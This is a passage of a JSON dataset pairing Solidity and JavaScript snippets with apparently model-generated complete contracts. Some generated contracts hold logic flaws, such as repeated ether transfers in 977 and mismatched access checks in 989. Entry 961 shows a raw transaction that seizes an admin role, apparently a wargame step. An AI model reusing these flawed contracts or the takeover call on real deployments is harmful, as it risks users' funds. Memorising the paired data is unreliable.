transactionResult.hash;\n    } catch (error) {\n      console.warn(error.message ? error.message : error);\n      return null;\n    } \n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyTokenContract {\n    mapping (address => bool) public associates;\n    address public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function associate() public {\n        associates[msg.sender] = true;\n    }\n\n    function dissociate() public {\n        require(associates[msg.sender] == true, \"You are not an associate.\");\n        associates[msg.sender] = false;\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Only the owner can call this function.\");\n        _;\n    }\n\n    function transferOwnership(address newOwner) public onlyOwner {\n        owner = newOwner;\n    }\n}\n\n",
        "changed": 0
    },
    "955.sol": {
        "input": "    require(\n        msg.value.getconversionRate(priceFeed) >= minimumUSD,\n        \"Didn't send enough!\"\n    );\n\n        it.only(\"Fails if not sending enough ETH\", async function () {\n            await expect(fundMe.fund()).to.be.revertedWith(\n                \"Didn't send enough!\"\n            )\n        })\n\n\n",
        "output": "",
        "changed": 0
    },
    "956.sol": {
        "input": "module.exports = {\n  solidity: {\n    compilers: [\n      {\n        version: \"0.8.2\",\n      },\n      {\n        version: \"0.8.9\",\n      },\n    ],\n  },\n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    uint256 private data;\n\n    function set(uint256 x) public {\n        data = x;\n    }\n\n    function get() public view returns (uint256) {\n        return data;\n    }\n}\n\n",
        "changed": 0
    },
    "957.sol": {
        "input": "Array(parseInt(requestCount))\n\nfunction getRequests() external view returns (Request[] memory) {\n    return requests;\n}\n\nconst requests = await campaign.methods.getRequests().call();\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Campaign {\n    struct Request {\n        string description;\n        uint value;\n        address payable recipient;\n        bool complete;\n    }\n\n    Request[] public requests;\n\n    function createRequest(string memory description, uint value, address payable recipient) public {\n        Request memory newRequest = Request({\n            description: description,\n            value: value,\n            recipient: recipient,\n            complete: false\n        });\n\n        requests.push(newRequest);\n    }\n\n    function getRequests() external view returns (Request[] memory) {\n        return requests;\n    }\n}\n\n",
        "changed": 0
    },
    "958.sol": {
        "input": " mapping(address => uint) public balanceOf;\n\ncontract UniswapV2Pair is IUniswapV2Pair, UniswapV2ERC20{}\n\nbalance0 = IERC20(_token0).balanceOf(address(this));\nbalance1 = IERC20(_token1).balanceOf(address(this));\n\nuint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\nuint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\nrequire(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');\n\n\n",
        "output": "",
        "changed": 0
    },
    "959.sol": {
        "input": "it('mint amount', async function () {\n    try {\n        await NFT.mint.sendTransaction(0);\n    }\n    catch (err) {\n        assert.equal(\"need to mint at least 1 NFT\", err.reason);\n    }\n});\n\nit('mint amount2', async function () {\n    try {\n        await NFT.mint.sendTransaction(1);\n    }\n    catch (err) {\n        assert.equal(\"max mint amount per session exceeded\", err.reason);\n    }\n});\n\nit('mint amount3', async function () {\n    try {\n        await NFT.mint.sendTransaction(2);\n    }\n    catch (err) {\n        assert.equal(\"max NFT limit exceeded\", err.reason);\n    }\n});\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract NFT {\n    address public owner;\n    uint256 public maxMintAmountPerSession = 1;\n    uint256 public totalMintedNFTs = 0;\n    uint256 public maxNFTs = 2;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Only owner can mint NFTs\");\n        _;\n    }\n\n    function mint(uint256 amount) public onlyOwner {\n        require(amount > 0, \"Need to mint at least 1 NFT\");\n        require(amount <= maxMintAmountPerSession, \"Max mint amount per session exceeded\");\n        totalMintedNFTs += amount;\n        require(totalMintedNFTs <= maxNFTs, \"Max NFT limit exceeded\");\n        // add logic to mint NFT\n    }\n}\n\n",
        "changed": 0
    },
    "960.sol": {
        "input": "contract testCatch{\n    function GetTest() public view returns (string memory)  {\n        address _token_addr = 0x406AB5033423Dcb6391Ac9eEEad73294FA82Cfbc;\n       \n        ERC165 candidateContract = ERC165(_token_addr);\n        try candidateContract.supportsInterface(0x80ac58cd) {\n\n             return \"tried\";\n        }\n        catch\n        {\n              return \"catch\";\n        }  \n}\n\n}\ninterface IERC165 {\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\n}\n \ncontract ERC165 is IERC165 {\n    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\n        require(2==3,\"wrong calculation\");\n        return interfaceId == type(IERC165).interfaceId;\n    }\n}\n\ncontract ERC165 is IERC165 {\n    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\n        return interfaceId == type(IERC165).interfaceId;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC165 {\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\n}\n\ncontract TestCatch {\n    IERC165 candidateContract;\n    \n    constructor() {\n        address _token_addr = 0x406AB5033423Dcb6391Ac9eEEad73294FA82Cfbc;\n        candidateContract = IERC165(_token_addr);\n    }\n    \n    function getTest() public view returns (string memory) {\n        try candidateContract.supportsInterface(bytes4(keccak256(\"supportsInterface(bytes4)\"))) {\n            return \"tried\";\n        } catch {\n            return \"catch\";\n        }\n    }\n}\n",
        "changed": 0
    },
    "961.sol": {
        "input": "web3.eth.abi.encodeFunctionSignature(\"proposeNewAdmin(address)\");\n> '0xa6376746'\n\nweb3.eth.abi.encodeParameter(\"address\", player);\n> '0x000000000000000000000000c3a005e15cb35689380d9c1318e981bca9339942'\n\ncontract.sendTransaction({ data: '0xa6376746000000000000000000000000c3a005e15cb35689380d9c1318e981bca9339942' });\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract AdminContract {\n    address public admin;\n\n    event NewAdminProposed(address proposedAdmin);\n\n    constructor() {\n        admin = msg.sender; \n    }\n\n    function proposeNewAdmin(address newAdmin) public {\n        require(msg.sender == admin, \"Only admin can propose a new admin\");\n        emit NewAdminProposed(newAdmin);\n    }\n}\n\n",
        "changed": 0
    },
    "962.sol": {
        "input": "function foo() public {\n    token.transfer(recipient, amount);\n}\n\nfunction foo() public {\n    (bool success, bytes memory returnedData) = address(token).call(\n        abi.encodeWithSignature(\n            \"transfer(address,uint256)\",\n            recipient,\n            amount\n        )\n    );\n}\n\nfunction foo() public {\n    try token.transfer(recipient, amount) returns (bool) {\n\n    } catch Error (string memory reason) {\n\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n    address payable recipient;\n    uint256 amount;\n    IERC20 token; // Assume IERC20 is an interface containing the function transfer()\n\n    constructor(address payable _recipient, uint256 _amount, IERC20 _token) public {\n        recipient = _recipient;\n        amount = _amount;\n        token = _token;\n    }\n\n    function foo() public {\n        token.transfer(recipient, amount);\n    }\n\n    function bar() public {\n        (bool success, bytes memory returnedData) = address(token).call(\n            abi.encodeWithSignature(\n                \"transfer(address,uint256)\",\n                recipient,\n                amount\n            )\n        );\n\n        require(success, \"Transfer failed.\");\n    }\n\n    function baz() public {\n        try token.transfer(recipient, amount) {\n\n        } catch Error (string memory reason) {\n            revert(reason);\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "963.sol": {
        "input": "function transfer(address to, uint tokens) public returns (bool success) {\n   if (msg.sender == \"specific-address\") {\n      balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n      balances[to] = safeAdd(balances[to], tokens);\n      emit Transfer(msg.sender, to, tokens);\n      return true;\n   }\n\n   return false;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyToken {\n    mapping(address => uint256) public balances;\n\n    event Transfer(address indexed from, address indexed to, uint256 tokens);\n\n    constructor() public {\n        balances[msg.sender] = 10000;\n    }\n\n    function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b <= a);\n        uint256 c = a - b;\n        return c;\n    }\n\n    function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a);\n        return c;\n    }\n\n    function transfer(address to, uint tokens) public returns (bool success) {\n        address specificAddress = 0x1234567890123456789012345678901234567890; // replace with your specific address\n        require(msg.sender == specificAddress, \"Only specific address can send tokens\");\n        balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n        balances[to] = safeAdd(balances[to], tokens);\n        emit Transfer(msg.sender, to, tokens);\n        return true;\n    }\n}\n\n",
        "changed": 0
    },
    "964.sol": {
        "input": "contract(\"Fundraiser\", accounts => {\n\n beforeEach(async () => {\n })\n describe(\"initialization\", () => {\n })\n})\n\n\n",
        "output": "pragma solidity ^0.5.16;\ncontract Fundraiser {\n    address payable public owner;\n    mapping(address => uint) public contributors;\n    uint public contributorsCount;\n\n    constructor() public {\n        owner = msg.sender;\n        contributorsCount = 0;\n    }\n\n    function contribute() public payable {\n        require(msg.value > 0, \"You must send some Ether to contribute.\");\n        contributors[msg.sender] = msg.value;\n        contributorsCount++;\n    }\n\n    function withdraw() public {\n        require(msg.sender == owner, \"Only the owner can withdraw funds.\");\n        owner.transfer(address(this).balance);\n    }\n\n    function getBalance() public view returns(uint) {\n        return address(this).balance;\n    }\n}\n\n",
        "changed": 0
    },
    "965.sol": {
        "input": "address public payable Beneficiary;\n\npayable(Beneficiary).transfer(address(this).balance);\n\n(bool success,) = payable(Beneficiary).call{value: address(this).balance}(\"\"); \nrequire(success, \"transaction failed\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    // The address of the beneficiary\n    address payable public Beneficiary;\n    \n    // The address of the owner\n    address public owner;\n    \n    // Sets the owner of the contract\n    constructor() {\n        owner = msg.sender;\n    }\n    \n    // Allows the owner to deposit funds\n    function deposit() public payable {\n        require(msg.sender == owner, \"Only the owner can deposit funds\");\n    }\n    \n    // Allows the beneficiary to withdraw all funds\n    function withdraw() public {\n        require(msg.sender == Beneficiary, \"Only the beneficiary can withdraw funds\");\n        \n        // Sends all the funds to the beneficiary\n        (bool success,) = payable(Beneficiary).call{value: address(this).balance}(\"\"); \n        require(success, \"Transaction failed\");\n    }\n    \n    // Allows the owner to set the beneficiary\n    function setBeneficiary(address payable _Beneficiary) public {\n        require(msg.sender == owner, \"Only the owner can set the beneficiary\");\n        Beneficiary = _Beneficiary;\n    }\n}\n\n",
        "changed": 0
    },
    "966.sol": {
        "input": "uint256 totalRevShare = onDeposit() pub payable {...+=msg.value}\n\n...\nuint256 unclaimedScope = totalRevShare - LastTotalRevShare[user];\nLastTotalRevShare[user] = totalRevShare;\nuint256 _userUnclaimedCut = unclaimedScope / totalReceivers;\n...\nmsg.sender.call{value:_userUnclaimedCut}(\"\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract RevenueShare {\n    mapping(address => uint256) public LastTotalRevShare;\n    uint256 public totalRevShare;\n    uint256 public totalReceivers;\n\n    // Event to emit whenever a deposit is made\n    event Deposit(address indexed sender, uint256 value);\n\n    constructor() public {\n        totalReceivers = 1; // Initialize totalReceivers to 1\n    }\n\n    function onDeposit() public payable {\n        require(msg.value > 0, \"Transfer amount must be greater than zero\");\n        totalRevShare += msg.value;\n        emit Deposit(msg.sender, msg.value);\n    }\n\n    function claim() public {\n        uint256 unclaimedScope = totalRevShare - LastTotalRevShare[msg.sender];\n        LastTotalRevShare[msg.sender] = totalRevShare;\n        uint256 _userUnclaimedCut = unclaimedScope / totalReceivers;\n        (bool success,) = msg.sender.call{value:_userUnclaimedCut}(\"\");\n        require(success, \"Failed to send Ether\");\n    }\n\n    function addReceiver() public {\n        totalReceivers += 1;\n    }\n\n    function removeReceiver() public {\n        require(totalReceivers > 1, \"Cannot reduce total receivers below 1\");\n        totalReceivers -= 1;\n    }\n\n    // Fallback function to accept ether\n    fallback() external payable {\n        onDeposit();\n    }\n}\n\n",
        "changed": 1
    },
    "967.sol": {
        "input": "pragma solidity ^0.8;\n\nabstract contract A {\n    function stake(address _userAddress, uint256 _amount) internal virtual {}\n}\n\n\ncontract B is A {\n    modifier updateRewards {\n        _;\n    }\n\n    function callStake() external {\n        stake(address(0x123), 1);\n    }\n    \n    function stake(address _userAddress, uint256 _amount) internal override updateRewards {}\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\nabstract contract A {\n    function stake(address _userAddress, uint256 _amount) internal virtual {}\n}\n\n\ncontract B is A {\n    modifier updateRewards {\n        _;\n    }\n\n    function callStake() external {\n        stake(address(0x123), 1);\n    }\n    \n    function stake(address _userAddress, uint256 _amount) internal override updateRewards {}\n}\n\n",
        "changed": 0
    },
    "968.sol": {
        "input": "const sendToContractTx = await owner.sendTransaction({\n  to: betContract.address,\n  value: ethers.utils.parseEther(\"1.0\")\n});\n\ncontract BetToken is ERC20, Ownable {\n    receive() external payable {}\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "969.sol": {
        "input": " mapping(string=>bool) private _usedTokenURIs;\n\nfunction tokenURIExists(string memory tokenURI) public view returns(bool){\n    return _usedTokenURIs[tokenURI]==true;\n  }\n\n  require(!tokenURIExists(tokenURI),\"Token URI already exists\")\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TokenURIContract {\n    mapping(string => bool) private _usedTokenURIs;\n\n    function tokenURIExists(string memory tokenURI) public view returns(bool){\n        return _usedTokenURIs[tokenURI];\n    }\n\n    function createTokenURI(string memory tokenURI) public {\n        require(!tokenURIExists(tokenURI),\"Token URI already exists\");\n        _usedTokenURIs[tokenURI] = true;\n    }\n}\n\n",
        "changed": 0
    },
    "970.sol": {
        "input": "const alchemyKey = process.env.ALCHEMY_KEY;\nconst CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS;\nconst { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\");\nconst web3 = createAlchemyWeb3(alchemyKey);\nconst contractABI = require('../contract-abi.json');\nexport const contract = new web3.eth.Contract(contractABI, CONTRACT_ADDRESS);\n\nexport const yourMethod = () => {\n if(window.ethereum.request({method: 'eth_requestAccounts'})){\n  const provider = new ethers.providers.Web3Provider(window.ethereum);\n  const signer = provider.getSigner();\n  const address = await signer.getAddress();\n\n  const tx = {\n   from: address,\n   to: CONTRACT_ADDRESS,\n   value: \"some wei value\", \n   data: contract.methods.YOUR_CONTRACT_METHOD_HERE().encodeABI()\n  }\n\n  const txHash = await window.ethereum.request({\n   method: 'eth_sendTransaction',\n   params: [tx]\n  });\n\n  console.log({txHash});\n }else{\n   console.log('user must connect wallet');\n }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleContract {\n    string public data;\n\n    function set(string memory _data) public {\n        data = _data;\n    }\n\n    function get() public view returns (string memory) {\n        return data;\n    }\n}\n\n",
        "changed": 0
    },
    "971.sol": {
        "input": "import \"@openzeppelin/contracts/utils/Strings.sol\";\n\n\n",
        "output": "",
        "changed": 0
    },
    "972.sol": {
        "input": "function delegatedGreeting(address _contract) external {\n    (bool success,) = _contract.delegatecall(\n        abi.encodeWithSignature(\"greet()\")\n    );\n    require(success == true, \"delegatecall failed\");\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DelegatedGreeting {\n    function delegatedGreeting(address _contract) external {\n        (bool success,) = _contract.delegatecall(\n            abi.encodeWithSignature(\"greet()\")\n        );\n        require(success == true, \"delegatecall failed\");\n    }\n}\n\n",
        "changed": 0
    },
    "973.sol": {
        "input": ".transfer(500000000000000000);\n\n.transfer(5e17);\n\n.transfer(0.5 ether);\n\n\n",
        "output": "pragma solidity ^0.5.16;\ncontract MyContract {\n    address payable public receiver1 = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;\n    address payable public receiver2 = 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c;\n    address payable public receiver3 = 0x4B0897b0513fdC7C541B6d9D7E929C4e5364D2dB;\n\n    function transferFunds() public payable {\n        require(msg.value >= 1.5 ether, \"Insufficient funds\");\n        receiver1.transfer(500000000000000000); // 0.5 ether\n        receiver2.transfer(5e17); // 0.5 ether\n        receiver3.transfer(0.5 ether); // 0.5 ether\n    }\n}\n\n",
        "changed": 0
    },
    "974.sol": {
        "input": "function getPair(address tokenA, address tokenB) external view returns (address pair);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IUniswapV2Factory {\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n}\n\ncontract MyContract {\n    address public uniswapV2FactoryAddress;\n\n    constructor(address _uniswapV2FactoryAddress) {\n        uniswapV2FactoryAddress = _uniswapV2FactoryAddress;\n    }\n\n    function getPair(address tokenA, address tokenB) public view returns (address) {\n        IUniswapV2Factory uniswapV2Factory = IUniswapV2Factory(uniswapV2FactoryAddress);\n        return uniswapV2Factory.getPair(tokenA, tokenB);\n    }\n}\n\n",
        "changed": 0
    },
    "975.sol": {
        "input": "constructor() payable {\n    admin = msg.sender;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address payable public admin;\n\n    constructor() payable {\n        admin = payable(msg.sender);\n    }\n\n    function transferToAdmin(uint256 amount) public {\n        require(msg.sender == admin, 'Only admin can transfer');\n        require(address(this).balance >= amount, 'Not enough balance');\n        admin.transfer(amount);\n    }\n\n    function getBalance() public view returns(uint256) {\n        return address(this).balance;\n    }\n}\n\n",
        "changed": 0
    },
    "976.sol": {
        "input": "pragma solidity 0.8.9;\n\ncontract PAY {\n    function sendEther(address payable receiver, uint256 amount) external payable {\n        uint val = msg.value;\n        require(val >= amount, \"Insufficient balance\");\n        (bool success, ) = receiver.call{value: val}(\"\");\n        require(success, \"Failed to send Ether\");\n    }\n}\n\n\n",
        "output": "pragma solidity 0.8.9;\n\ncontract PAY {\n    function sendEther(address payable receiver, uint256 amount) external payable {\n        uint val = msg.value;\n        require(val >= amount, \"Insufficient balance\");\n        (bool success, ) = receiver.call{value: val}(\"\");\n        // receiver.transfer(val);\n        require(success, \"Failed to send Ether\");\n    }\n}\n\n",
        "changed": 0
    },
    "977.sol": {
        "input": "if (ethToSend > 0) {\n    payable(_projectWallet).transfer(ethToSend);\n}\npayable(_marketingWallet).transfer(ethToSend);\n\nif (ethToSend > 0) {\n    payable(_projectWallet).transfer(ethToSend);\n    payable(_marketingWallet).transfer(ethToSend);\n}\n\npayable(_projectWallet).transfer(ethToSend / 2);\npayable(_marketingWallet).transfer(ethToSend / 2);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address private _projectWallet;\n    address private _marketingWallet;\n\n    constructor(address projectWallet, address marketingWallet) {\n        _projectWallet = projectWallet;\n        _marketingWallet = marketingWallet;\n    }\n\n    function sendEther(uint256 ethToSend) public payable {\n        require(msg.value >= ethToSend, \"Not enough Ether provided.\");\n\n        if (ethToSend > 0) {\n            payable(_projectWallet).transfer(ethToSend);\n        }\n        payable(_marketingWallet).transfer(ethToSend);\n\n        if (ethToSend > 0) {\n            payable(_projectWallet).transfer(ethToSend);\n            payable(_marketingWallet).transfer(ethToSend);\n        }\n\n        payable(_projectWallet).transfer(ethToSend / 2);\n        payable(_marketingWallet).transfer(ethToSend / 2);\n    }\n}\n\n",
        "changed": 0
    },
    "978.sol": {
        "input": "contract Scrath {\n\n    address private immutable weth;\n\n    constructor(address _weth){\n       weth = _weth;\n    }\n\n    function sendEth() external payable {}\n\n    function ethBalance() public view returns(uint256 _balance) {\n        _balance =  address(this).balance;\n        return _balance;\n    }\n\n    function convertToWeth() external payable {\n        uint256 eth = ethBalance();\n        IWETH(weth).deposit{value: eth}();\n    }\n\n    function wethBalance() external view returns(uint256 _balance) {\n        _balance = IWETH(weth).balanceOf(address(this));\n        return _balance;\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IWETH {\n    function deposit() external payable;\n    function withdraw(uint wad) external;\n    function totalSupply() external view returns (uint);\n    function balanceOf(address account) external view returns (uint);\n    function transfer(address recipient, uint amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint);\n    function approve(address spender, uint amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\n}\n\ncontract Scrath {\n\n    address private immutable weth;\n\n    constructor(address _weth){\n       weth = _weth;\n    }\n\n    function sendEth() external payable {}\n\n    function ethBalance() public view returns(uint256 _balance) {\n        _balance =  address(this).balance;\n        return _balance;\n    }\n\n    function convertToWeth() external payable {\n        uint256 eth = ethBalance();\n        IWETH(weth).deposit{value: eth}();\n    }\n\n    function wethBalance() external view returns(uint256 _balance) {\n        _balance = IWETH(weth).balanceOf(address(this));\n        return _balance;\n    }\n\n}\n\n",
        "changed": 0
    },
    "980.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    bytes3 symbol = 0x455448; \n\n    function convertByteToString() public view returns(string memory){\n        string memory result = string(abi.encode(symbol));\n        return result;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    bytes3 symbol = 0x455448; // hex-encoded ASCII value of \"ETH\"\n\n    function convertByteToString() public view returns(string memory){\n        string memory result = string(abi.encode(symbol));\n        return result;\n    }\n}\n\n",
        "changed": 0
    },
    "981.sol": {
        "input": "import {Test, stdError} from \"@forge-std/Test.sol\";\n...\n\n\n",
        "output": "",
        "changed": 0
    },
    "982.sol": {
        "input": "struct Note {\n    uint datetime;\n    bool done;\n    string note;\n}\n\nmapping (address => Note[]) notesPerUser;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Notes {\n    struct Note {\n        uint datetime;\n        bool done;\n        string note;\n    }\n\n    mapping (address => Note[]) public notesPerUser;\n\n    function addNote(string calldata _note) public {\n        Note memory newNote;\n        newNote.datetime = block.timestamp;\n        newNote.done = false;\n        newNote.note = _note;\n        \n        notesPerUser[msg.sender].push(newNote);\n    }\n\n    function markNoteAsDone(uint _noteIndex) public {\n        require(_noteIndex < notesPerUser[msg.sender].length, \"Note index out of bounds\");\n        \n        notesPerUser[msg.sender][_noteIndex].done = true;\n    }\n\n    function getNotes() public view returns(Note[] memory) {\n        return notesPerUser[msg.sender];\n    }\n}\n\n",
        "changed": 0
    },
    "983.sol": {
        "input": "function deposit(address ticker,address sender,address recipient,uint256 amount\n                ) \n                external payable \n\nawait dex.deposit(\"0xa36085f69e2889c224210f603d836748e7dc0088\", \"0x5226a51522C23CcBEFd04a2d4C6c8e281eD1d680\", \"0xB643992c9fBcb1Cb06b6C9eb278b2ac35e6a2711\", \"1\",\n{from:accounts[0])\n\n \n\ncontract(\"Dex\", (accounts) => {\n  let contractOwner = null;\n  let buyer = null;\n  let _contract = null;\n\n\n  before(async () => {\n      _contract = await Dex.deployed();\n      contractOwner = accounts[0];\n      buyer = accounts[1];\n  });\n\n}\n\nfunction transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n            unchecked {\n                _approve(sender, _msgSender(), currentAllowance - amount);\n            }\n        }  \n        _transfer(sender, recipient, amount);\n\n        return true;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Dex {\n    address private contractOwner;\n    address private buyer;\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n    event Deposit(address indexed ticker, address indexed sender, address indexed recipient, uint256 amount);\n\n    constructor() {\n        contractOwner = msg.sender;\n    }\n\n    function deposit(\n        address ticker,\n        address sender,\n        address recipient,\n        uint256 amount\n    ) \n    external payable \n    {\n        // Emit the Deposit event\n        emit Deposit(ticker, sender, recipient, amount);\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) \n    public \n    returns (bool) \n    {\n        uint256 currentAllowance = _allowances[sender][msg.sender];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        _allowances[sender][msg.sender] = currentAllowance - amount;\n        _transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) \n    internal \n    {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        // Write your logic to transfer tokens from sender to recipient\n    }\n}\n\n",
        "changed": 0
    },
    "984.sol": {
        "input": " function _afterTokenTransfer(address from, address to, uint256 amount)\n        internal\n        override(ERC20, ERC20Votes)\n    {\n        super._afterTokenTransfer(from, to, amount);\n    }\n\n override(ERC20, ERC20Votes)\n\n function _afterTokenTransfer(address from, address to, uint256 amount)\n            internal\n            override\n        {\n            super._afterTokenTransfer(from, to, amount);\n        }\n\n\n",
        "output": "",
        "changed": 0
    },
    "985.sol": {
        "input": "\npragma solidity 0.8.17;\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/AccessControl.sol\";\n\ncontract FamCash is ERC20, AccessControl{\n    bytes32 public constant PARENT = keccak256(\"PARENT\");\n    bytes32 public constant MEMBER = keccak256(\"MEMBER\");\n\n    uint256 public maxSupplyLimit = 1000000;\n\n\n    constructor(\n        address contractOwner,\n        string memory tokenName,\n        string memory tokenTicker\n    ) ERC20(tokenName, tokenTicker) {\n        grantRole(DEFAULT_ADMIN_ROLE, contractOwner);\n        grantRole(PARENT, contractOwner);\n        grantRole(MEMBER, contractOwner);\n    }\n\n    function mint(address recipient, uint256 amount) public {\n        require(!hasRole(PARENT,address(0)), \"Only parents can mint.\");\n\n        require(recipient != address(0), \"Invalid recipient address\");\n        require(amount > 0, \"Amount must be greater than zero\");\n\n        uint256 totalSupplyAfterMint = totalSupply() + amount;\n\n        require(\n            totalSupplyAfterMint <= maxSupplyLimit,\n            \"Exceeds max supply limit\"\n        );\n\n        _mint(recipient, amount);\n    }\n\n    function send(address recipient, uint256 amount) public {\n        require(\n            !hasRole(PARENT, msg.sender) || !hasRole(MEMBER, msg.sender),\n            \"Only family members can send tokens.\"\n        );\n\n        _transfer(msg.sender, recipient, amount);\n    }\n\n    function addParent(address parent) public {\n        require(!hasRole(PARENT,address(0)), \"Only parents can add parents.\");\n\n        require(!hasRole(PARENT, parent), \"They're already a parent\");\n\n        grantRole(PARENT, parent);\n    }\n\n    function addMember(address member) public {\n        require(!hasRole(PARENT, address(0)), \"Only parents can mint.\");\n\n        require(!hasRole(MEMBER, member), \"Address is already a member\");\n\n        grantRole(MEMBER, member);\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "986.sol": {
        "input": "function getIndex(address walletAddress) view private returns(uint){\n  for (uint i = 0; i < kids.length; i++){\n    if(kids[i].walletAddress == walletAddress){{ \n      return i;\n    }\n  }\n return 999;\n}\n\nfunction getIndex(address walletAddress) view private returns(uint){\n  for (uint i = 0; i < kids.length; i++){\n    if(kids[i].walletAddress == walletAddress) {\n      return i;\n    }\n  }\n return 999;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Wallet {\n    struct Kid {\n        address walletAddress;\n    }\n    \n    Kid[] public kids;\n    \n    function addKid(address walletAddress) public {\n        kids.push(Kid(walletAddress));\n    }\n\n    function getIndex(address walletAddress) view private returns(uint) {\n        for (uint i = 0; i < kids.length; i++) {\n            if(kids[i].walletAddress == walletAddress) {\n                return i;\n            }\n        }\n        return 999;\n    }\n}\n\n",
        "changed": 0
    },
    "987.sol": {
        "input": "contract A {\n    event Log(string message);\n\n    function foo() public virtual {\n        emit Log(\"A.foo called\");\n    }\n\n    function bar() public virtual {\n        emit Log(\"A.bar called\");\n    }\n}\n    \ncontract B is A {\n    function foo() public virtual override {\n        emit Log(\"B.foo called\");\n        A.foo();\n    }\n\n    function bar() public virtual override {\n        emit Log(\"B.bar called\");\n        super.bar();\n    }\n}\n\n\n",
        "output": "contract A {\n    event Log(string message);\n\n    function foo() public virtual {\n        emit Log(\"A.foo called\");\n    }\n\n    function bar() public virtual {\n        emit Log(\"A.bar called\");\n    }\n}\n    \ncontract B is A {\n    function foo() public virtual override {\n        emit Log(\"B.foo called\");\n        A.foo();\n    }\n\n    function bar() public virtual override {\n        emit Log(\"B.bar called\");\n        super.bar();\n    }\n}\n\n",
        "changed": 0
    },
    "988.sol": {
        "input": "constructor (string memory _name) myConstruct(_name) {}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    string public name;\n\n    constructor (string memory _name) {\n        name = _name;\n    }\n}\n\n",
        "changed": 0
    },
    "989.sol": {
        "input": " function changeVote() public checkSender(msg.sender){\n        olderVoter = caller;\n    }\n\nfunction changeVote() public checkSender(msg.sender){\n        require(oldVoter != actualVoter); \n        olderVoter = caller;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Voting {\n    address public olderVoter;\n    address public oldVoter;\n    address public actualVoter;\n    \n    modifier checkSender(address _sender) {\n        require(_sender == msg.sender, \"Only the contract creator can call this.\");\n        _;\n    }\n\n    function changeVote() public checkSender(msg.sender){\n        olderVoter = msg.sender;\n    }\n\n    function updateVote() public checkSender(msg.sender){\n        require(oldVoter != actualVoter, \"The old voter cannot be the actual voter.\"); \n        olderVoter = msg.sender;\n    }\n\n    constructor() public {\n        actualVoter = msg.sender; \n    }\n}\n\n",
        "changed": 0
    },
    "990.sol": {
        "input": "transfer(msg.sender, _amount);\n\nfunction getToken(uint256 _amount) external {\n    _mint(msg.sender, _amount);\n}\n\nconstructor() {\n    _mint(address(this), 10000000 * 10 ** decimals());\n    \n    _mint(msg.sender, 21000000 * 10 ** decimals());\n\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "991.sol": {
